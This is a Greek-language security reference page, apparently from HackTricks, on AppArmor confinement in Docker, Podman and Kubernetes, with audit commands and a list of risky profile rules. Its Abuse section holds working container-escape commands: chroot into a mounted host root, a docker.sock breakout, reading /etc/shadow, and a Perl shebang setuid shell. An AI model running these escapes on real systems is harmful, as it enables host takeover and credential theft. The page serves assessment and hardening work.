# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

AppArmor είναι ένα **Υποχρεωτικό Σύστημα Ελέγχου Πρόσβασης** που εφαρμόζει περιορισμούς μέσω προφίλ ανά πρόγραμμα. Σε αντίθεση με τους παραδοσιακούς ελέγχους DAC, που εξαρτώνται σε μεγάλο βαθμό από την ιδιοκτησία χρήστη και ομάδας, το AppArmor επιτρέπει στον kernel να επιβάλλει μια πολιτική συνδεδεμένη στη διαδικασία ίδια. Σε περιβάλλοντα container, αυτό έχει σημασία επειδή ένα workload μπορεί να έχει αρκετά παραδοσιακά προνόμια για να επιχειρήσει μια ενέργεια και παρ’ όλα αυτά να του αρνηθεί η πρόσβαση επειδή το προφίλ AppArmor δεν επιτρέπει το σχετικό path, mount, συμπεριφορά δικτύου ή χρήση capability.

Το πιο σημαντικό εννοιολογικό σημείο είναι ότι το AppArmor είναι **βασισμένο σε διαδρομές**. Εξετάζει την πρόσβαση στο filesystem μέσω κανόνων path αντί μέσω ετικετών όπως κάνει το SELinux. Αυτό το καθιστά προσιτό και ισχυρό, αλλά επίσης σημαίνει ότι τα bind mounts και οι εναλλακτικές διατάξεις διαδρομών χρειάζονται προσεκτική προσοχή. Εάν το ίδιο περιεχόμενο του host γίνει προσβάσιμο μέσω διαφορετικού path, το αποτέλεσμα της πολιτικής μπορεί να μην είναι αυτό που ο χειριστής αρχικά περίμενε.

## Ρόλος στην Απομόνωση Container

Οι αναθεωρήσεις ασφάλειας container συχνά σταματούν στις capabilities και το seccomp, αλλά το AppArmor παραμένει σημαντικό μετά από αυτούς τους ελέγχους. Φανταστείτε ένα container που έχει περισσότερα προνόμια από όσα θα έπρεπε, ή ένα workload που χρειάστηκε ένα επιπλέον capability για λειτουργικούς λόγους. Το AppArmor μπορεί ακόμα να περιορίσει την πρόσβαση σε αρχεία, τη συμπεριφορά mount, το networking και τα μοτίβα εκτέλεσης με τρόπους που σταματούν την προφανή οδό κατάχρησης. Αυτός είναι ο λόγος που το απενεργοποίηση του AppArmor «μόνο για να δουλέψει η εφαρμογή» μπορεί σιωπηρά να μετατρέψει μια απλώς ριψοκίνδυνη διαμόρφωση σε μία που είναι ενεργά εκμεταλλεύσιμη.

## Εργαστήριο

Για να ελέγξετε εάν το AppArmor είναι ενεργό στο host, χρησιμοποιήστε:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Για να δείτε υπό ποιον τρέχει η τρέχουσα container process:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Η διαφορά είναι διδακτική. Στην κανονική περίπτωση, η διεργασία θα πρέπει να εμφανίζει ένα AppArmor context δεμένο με το profile που επέλεξε το runtime. Στην περίπτωση unconfined, αυτό το επιπλέον επίπεδο περιορισμού εξαφανίζεται.

Μπορείτε επίσης να ελέγξετε τι πιστεύει το Docker ότι εφάρμοσε:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Χρήση κατά την εκτέλεση

Το Docker μπορεί να εφαρμόσει ένα προεπιλεγμένο ή προσαρμοσμένο προφίλ AppArmor όταν ο host το υποστηρίζει. Το Podman μπορεί επίσης να ενσωματωθεί με AppArmor σε συστήματα βασισμένα σε AppArmor, αν και σε διανομές όπου το SELinux έχει προτεραιότητα, το άλλο MAC σύστημα συχνά κυριαρχεί. Το Kubernetes μπορεί να εκθέσει πολιτική AppArmor σε επίπεδο workload σε κόμβους που πραγματικά υποστηρίζουν AppArmor. Το LXC και σχετικά περιβάλλοντα system-container της οικογένειας Ubuntu χρησιμοποιούν επίσης εκτενώς AppArmor.

Το ουσιαστικό σημείο είναι ότι το AppArmor δεν είναι ένα "Docker feature". Είναι μια δυνατότητα του host-kernel που διάφορα runtimes μπορούν να επιλέξουν να εφαρμόσουν. Αν ο host δεν το υποστηρίζει ή το runtime έχει ειδοποιηθεί να τρέχει unconfined, η υποτιθέμενη προστασία δεν υπάρχει πραγματικά.

Για το Kubernetes συγκεκριμένα, το σύγχρονο API είναι `securityContext.appArmorProfile`. Από το Kubernetes `v1.30`, οι παλαιότερες beta AppArmor annotations έχουν αποσυρθεί. Σε hosts που υποστηρίζονται, το `RuntimeDefault` είναι το προεπιλεγμένο προφίλ, ενώ το `Localhost` δείχνει σε ένα προφίλ που πρέπει ήδη να είναι φορτωμένο στον node. Αυτό έχει σημασία κατά την ανασκόπηση γιατί ένα manifest μπορεί να φαίνεται AppArmor-aware ενώ εξακολουθεί να εξαρτάται πλήρως από την υποστήριξη στην πλευρά του node και τα προφορτωμένα προφίλ.

Μια λεπτή αλλά χρήσιμη επιχειρησιακή λεπτομέρεια είναι ότι η ρητή ρύθμιση `appArmorProfile.type: RuntimeDefault` είναι αυστηρότερη από το απλό παράλειμμα του πεδίου. Αν το πεδίο είναι ρητά ορισμένο και ο node δεν υποστηρίζει AppArmor, το admission θα πρέπει να αποτύχει. Αν το πεδίο παραλειφθεί, το workload μπορεί να τρέξει σε node χωρίς AppArmor και απλώς να μην λάβει αυτό το επιπλέον επίπεδο περιορισμού. Από την πλευρά ενός επιτιθέμενου, αυτό είναι ένας καλός λόγος να ελέγχετε και το manifest και την πραγματική κατάσταση του node.

Σε hosts με δυνατότητα AppArmor και Docker, το πιο γνωστό προεπιλεγμένο είναι `docker-default`. Αυτό το προφίλ δημιουργείται από το AppArmor template του Moby και είναι σημαντικό γιατί εξηγεί γιατί μερικά capability-based PoCs εξακολουθούν να αποτυγχάνουν σε ένα προεπιλεγμένο container. Σε γενικές γραμμές, το `docker-default` επιτρέπει την κανονική δικτύωση, απαγορεύει εγγραφές σε μεγάλο μέρος του `/proc`, απαγορεύει πρόσβαση σε ευαίσθητα μέρη του `/sys`, μπλοκάρει λειτουργίες mount και περιορίζει το ptrace ώστε να μην είναι γενικός μηχανισμός probing του host. Η κατανόηση αυτού του baseline βοηθάει να διαχωρίσουμε το "το container έχει `CAP_SYS_ADMIN`" από το "το container μπορεί πραγματικά να χρησιμοποιήσει αυτή την capability ενάντια στις kernel interfaces που με ενδιαφέρουν".

## Διαχείριση προφίλ

AppArmor profiles αποθηκεύονται συνήθως κάτω από `/etc/apparmor.d/`. Μια κοινή σύμβαση ονοματοδοσίας είναι να αντικαθίστανται οι κάθετες γραμμές (slashes) στη διαδρομή του εκτελέσιμου με τελείες. Για παράδειγμα, ένα προφίλ για `/usr/bin/man` αποθηκεύεται συνήθως ως `/etc/apparmor.d/usr.bin.man`. Αυτή η λεπτομέρεια έχει σημασία τόσο στην άμυνα όσο και στην αξιολόγηση γιατί μόλις γνωρίζετε το ενεργό όνομα προφίλ, συχνά μπορείτε γρήγορα να εντοπίσετε το αντίστοιχο αρχείο στον host.

Χρήσιμες εντολές διαχείρισης στην πλευρά του host περιλαμβάνουν:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Ο λόγος που αυτές οι εντολές έχουν σημασία σε ένα container-security reference είναι ότι εξηγούν πώς τα προφίλ κατασκευάζονται πραγματικά, φορτώνονται, εναλλάσσονται σε complain mode και τροποποιούνται μετά από αλλαγές στην εφαρμογή. Αν ένας χειριστής έχει τη συνήθεια να βάζει τα προφίλ σε complain mode κατά την αντιμετώπιση προβλημάτων και να ξεχνά να επαναφέρει την επιβολή, το container μπορεί να φαίνεται προστατευμένο στην τεκμηρίωση ενώ στην πραγματικότητα να συμπεριφέρεται πολύ πιο χαλαρά.

### Δημιουργία και Ενημέρωση Προφίλ

`aa-genprof` μπορεί να παρακολουθεί τη συμπεριφορά της εφαρμογής και να βοηθήσει να δημιουργηθεί ένα προφίλ διαδραστικά:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` μπορεί να δημιουργήσει ένα πρότυπο προφίλ που μπορεί αργότερα να φορτωθεί με `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Όταν το binary αλλάζει και η πολιτική χρειάζεται ενημέρωση, `aa-logprof` μπορεί να αναπαράγει απορρίψεις που βρέθηκαν στα logs και να βοηθήσει τον χειριστή να αποφασίσει αν θα τις επιτρέψει ή θα τις απορρίψει:
```bash
sudo aa-logprof
```
### Καταγραφές

Οι αρνήσεις του AppArmor είναι συχνά ορατές μέσω του `auditd`, του syslog ή εργαλείων όπως το `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Αυτό είναι χρήσιμο επιχειρησιακά και επιθετικά. Οι αμυνόμενοι το χρησιμοποιούν για να βελτιώσουν τα προφίλ. Οι επιτιθέμενοι το χρησιμοποιούν για να μάθουν ποιο ακριβώς μονοπάτι ή λειτουργία απορρίπτεται και αν το AppArmor είναι ο έλεγχος που μπλοκάρει μια αλυσίδα εκμετάλλευσης.

### Εντοπισμός του ακριβούς αρχείου προφίλ

Όταν ένα runtime εμφανίζει ένα συγκεκριμένο όνομα προφίλ AppArmor για ένα container, συχνά είναι χρήσιμο να αντιστοιχίσετε αυτό το όνομα πίσω στο αρχείο προφίλ στο δίσκο:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Αυτό είναι ιδιαίτερα χρήσιμο κατά την host-side ανασκόπηση επειδή γεφυρώνει το χάσμα μεταξύ "το container λέει ότι τρέχει υπό profile `lowpriv`" και "οι πραγματικοί κανόνες βρίσκονται σε αυτό το συγκεκριμένο αρχείο που μπορεί να ελεγχθεί ή να ξαναφορτωθεί".

### Κανόνες υψηλής σημασίας για έλεγχο

Όταν μπορείτε να διαβάσετε ένα profile, μην σταματήσετε στις απλές γραμμές `deny`. Ορισμένοι τύποι κανόνων αλλάζουν ουσιωδώς το πόσο χρήσιμο θα είναι το AppArmor απέναντι σε ένα container escape attempt:

- `ux` / `Ux`: εκτελεί το target binary χωρίς confinement. Αν ένας reachable helper, shell, ή interpreter επιτρέπεται υπό `ux`, αυτό συνήθως είναι το πρώτο πράγμα που πρέπει να δοκιμάσετε.
- `px` / `Px` και `cx` / `Cx`: εκτελούν profile transitions στο exec. Δεν είναι αυτομάτως κακά, αλλά αξίζουν έλεγχο επειδή μια μετάβαση μπορεί να καταλήξει σε ένα πολύ ευρύτερο profile από το τρέχον.
- `change_profile`: επιτρέπει σε μια διεργασία να αλλάξει σε άλλο φορτωμένο profile, άμεσα ή στο επόμενο exec. Αν το destination profile είναι ασθενέστερο, αυτό μπορεί να γίνει η προτιμώμενη διαδρομή διαφυγής από ένα περιοριστικό domain.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: αυτά πρέπει να αλλάξουν πόση εμπιστοσύνη δίνετε στο profile. `complain` καταγράφει denials αντί να τα εφαρμόζει, `unconfined` αφαιρεί το boundary, και `prompt` εξαρτάται από μια userspace decision path παρά από καθαρό kernel-enforced deny.
- `userns` or `userns create,`: νεότερη πολιτική AppArmor μπορεί να μεσολαβήσει τη δημιουργία user namespaces. Αν ένα container profile ρητά το επιτρέπει, nested user namespaces παραμένουν σε ισχύ ακόμα και όταν η πλατφόρμα χρησιμοποιεί AppArmor ως μέρος της στρατηγικής hardening.

Χρήσιμο host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Αυτό το είδος ελέγχου είναι συχνά πιο χρήσιμο από το να κοιτάς επίμονα εκατοντάδες συνηθισμένους κανόνες αρχείων. Εάν ένα breakout εξαρτάται από την εκτέλεση ενός helper, την είσοδο σε ένα νέο namespace, ή την απόδραση σε ένα λιγότερο περιοριστικό profile, η απάντηση συχνά κρύβεται σε αυτούς τους κανόνες προσανατολισμένους στις μεταβάσεις αντί στις προφανείς γραμμές τύπου `deny /etc/shadow r`.

## Misconfigurations

Το πιο προφανές λάθος είναι το `apparmor=unconfined`. Οι διαχειριστές συχνά το ορίζουν ενώ κάνουν debugging μιας εφαρμογής που απέτυχε επειδή το profile απέκλεισε σωστά κάτι επικίνδυνο ή απροσδόκητο. Αν η σημαία παραμείνει σε production, ολόκληρο το MAC layer έχει ουσιαστικά αφαιρεθεί.

Ένα άλλο λεπτό πρόβλημα είναι η υπόθεση ότι τα bind mounts είναι ακίνδυνα επειδή τα δικαιώματα αρχείων φαίνονται κανονικά. Επειδή το AppArmor είναι path-based, η έκθεση host paths κάτω από εναλλακτικές mount locations μπορεί να αλληλεπιδρά άσχημα με τους path rules. Ένα τρίτο λάθος είναι να ξεχνάτε ότι ένα profile name σε ένα config file σημαίνει πολύ λίγα αν ο host kernel δεν εφαρμόζει πραγματικά το AppArmor.

## Abuse

Όταν το AppArmor απουσιάζει, λειτουργίες που προηγουμένως ήταν περιορισμένες μπορεί ξαφνικά να δουλέψουν: ανάγνωση sensitive paths μέσω bind mounts, πρόσβαση σε μέρη του procfs ή του sysfs που θα έπρεπε να ήταν δυσκολότερο να χρησιμοποιηθούν, εκτέλεση mount-related actions αν και οι capabilities/seccomp το επιτρέπουν, ή χρήση paths που ένα profile κανονικά θα απέρριπτε. Το AppArmor συχνά είναι ο μηχανισμός που εξηγεί γιατί μια capability-based breakout προσπάθεια "should work" στο χαρτί αλλά αποτυγχάνει στην πράξη. Αφαιρέστε το AppArmor, και η ίδια προσπάθεια μπορεί να αρχίσει να πετυχαίνει.

Αν υποψιάζεστε ότι το AppArmor είναι το κύριο στοιχείο που εμποδίζει μια path-traversal, bind-mount, ή mount-based abuse chain, το πρώτο βήμα συνήθως είναι να συγκρίνετε τι γίνεται προσβάσιμο με και χωρίς ένα profile. Για παράδειγμα, αν ένα host path είναι mounted μέσα στο container, ξεκινήστε ελέγχοντας αν μπορείτε να το traverse και να το read:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Αν το container έχει επίσης μια επικίνδυνη δυνατότητα όπως το `CAP_SYS_ADMIN`, ένα από τα πιο πρακτικά τεστ είναι να ελέγξετε αν το AppArmor είναι ο έλεγχος που εμποδίζει τις mount operations ή την πρόσβαση σε ευαίσθητα kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Σε περιβάλλοντα όπου ένα host path είναι ήδη διαθέσιμο μέσω bind mount, η απώλεια του AppArmor μπορεί επίσης να μετατρέψει ένα read-only information-disclosure issue σε direct host file access:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Το νόημα αυτών των εντολών δεν είναι ότι το AppArmor από μόνο του δημιουργεί το breakout. Το σημαντικό είναι ότι μόλις αφαιρεθεί το AppArmor, πολλοί τρόποι κατάχρησης βασισμένοι στο filesystem και σε mounts γίνονται άμεσα δοκιμάσιμοι.

### Πλήρες Παράδειγμα: AppArmor απενεργοποιημένο + root του host προσαρτημένο

Εάν το container ήδη έχει το host root bind-mounted στο `/host`, η αφαίρεση του AppArmor μπορεί να μετατρέψει μια αποκλεισμένη διαδρομή κατάχρησης στο filesystem σε πλήρη host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Μόλις το shell εκτελείται μέσω του host filesystem, το workload έχει ουσιαστικά ξεφύγει από τα όρια του container:
```bash
id
hostname
cat /etc/shadow | head
```
### Πλήρες Παράδειγμα: AppArmor απενεργοποιημένο + Runtime Socket

Εάν το πραγματικό εμπόδιο ήταν το AppArmor γύρω από το runtime state, ένα mounted socket μπορεί να είναι αρκετό για μια πλήρη διαφυγή:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Η ακριβής διαδρομή εξαρτάται από το mount point, αλλά το τελικό αποτέλεσμα είναι το ίδιο: AppArmor δεν εμποδίζει πλέον την πρόσβαση στο runtime API, και το runtime API μπορεί να εκκινήσει ένα host-compromising container.

### Πλήρες Παράδειγμα: Path-Based Bind-Mount Bypass

Επειδή το AppArmor είναι path-based, η προστασία του `/proc/**` δεν προστατεύει αυτόματα το ίδιο host procfs περιεχόμενο όταν αυτό είναι προσβάσιμο μέσω διαφορετικής διαδρομής:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Ο αντίκτυπος εξαρτάται από το τι ακριβώς είναι mounted και αν ο εναλλακτικός δρόμος παρακάμπτει επίσης άλλους ελέγχους, αλλά αυτό το μοτίβο είναι ένας από τους πιο ξεκάθαρους λόγους για τους οποίους το AppArmor πρέπει να αξιολογείται μαζί με το mount layout και όχι απομονωμένα.

### Πλήρες Παράδειγμα: Shebang Bypass

Η πολιτική AppArmor μερικές φορές στοχεύει ένα interpreter path με τρόπο που δεν λαμβάνει πλήρως υπόψη την εκτέλεση script μέσω του shebang handling. Ένα ιστορικό παράδειγμα αφορούσε τη χρήση ενός script του οποίου η πρώτη γραμμή δείχνει σε έναν confined interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Αυτό το είδος παραδείγματος είναι σημαντικό ως υπενθύμιση ότι η πρόθεση ενός προφίλ και η πραγματική σημασιολογία εκτέλεσης μπορεί να αποκλίνουν. Όταν εξετάζετε το AppArmor σε περιβάλλοντα container, οι αλυσίδες διερμηνέα και οι εναλλακτικές διαδρομές εκτέλεσης αξίζουν ειδική προσοχή.

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να απαντήσουν γρήγορα σε τρία ερωτήματα: είναι το AppArmor ενεργοποιημένο στον host, είναι η τρέχουσα διεργασία περιορισμένη, και αν το runtime όντως εφάρμοσε ένα προφίλ σε αυτό το container;
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Αν `/proc/self/attr/current` δείχνει `unconfined`, το φορτίο εργασίας δεν επωφελείται από τον περιορισμό του AppArmor.
- Αν `aa-status` δείχνει AppArmor απενεργοποιημένο ή μη φορτωμένο, οποιοδήποτε όνομα προφίλ στη ρύθμιση χρόνου εκτέλεσης είναι κυρίως διακοσμητικό.
- Αν `docker inspect` δείχνει `unconfined` ή ένα απρόσμενο custom profile, αυτό συχνά είναι ο λόγος που μια διαδρομή κατάχρησης βασισμένη σε filesystem ή mount λειτουργεί.
- Αν `/sys/kernel/security/apparmor/profiles` δεν περιέχει το προφίλ που περίμενες, η ρύθμιση του runtime ή του orchestrator δεν αρκεί από μόνη της.
- Αν ένα υποτιθέμενα σκληρυμένο προφίλ περιέχει `ux`, ευρείες `change_profile`, `userns`, ή κανόνες τύπου `flags=(complain)`, τα πρακτικά όρια μπορεί να είναι πολύ πιο αδύναμα από αυτά που υποδηλώνει το όνομα του προφίλ.

Αν ένα container έχει ήδη αυξημένα προνόμια για λειτουργικούς λόγους, η διατήρηση του AppArmor ενεργού συχνά κάνει τη διαφορά μεταξύ μιας ελεγχόμενης εξαίρεσης και μιας πολύ ευρύτερης αποτυχίας ασφαλείας.

## Προεπιλεγμένες ρυθμίσεις χρόνου εκτέλεσης

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένη χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Χρησιμοποιεί το `docker-default` AppArmor profile εκτός αν παρεκκλίνει | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | Το AppArmor υποστηρίζεται μέσω `--security-opt`, αλλά η ακριβής προεπιλογή εξαρτάται από τον host/runtime και είναι λιγότερο καθολική από το τεκμηριωμένο `docker-default` profile του Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Προεπιλεγμένο υπό όρους | Αν `appArmorProfile.type` δεν καθορίζεται, η προεπιλογή είναι `RuntimeDefault`, αλλά εφαρμόζεται μόνο όταν AppArmor είναι ενεργό στον node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Ακολουθεί την υποστήριξη του node/runtime | Τα κοινά runtimes που υποστηρίζονται από Kubernetes υποστηρίζουν AppArmor, αλλά η πραγματική επιβολή εξαρτάται από την υποστήριξη του node και τις ρυθμίσεις του workload | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Για το AppArmor, η πιο σημαντική μεταβλητή συχνά είναι ο **host**, όχι μόνο το runtime. Μια ρύθμιση προφίλ σε ένα manifest δεν δημιουργεί περιορισμό σε έναν node όπου το AppArmor δεν είναι ενεργοποιημένο.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
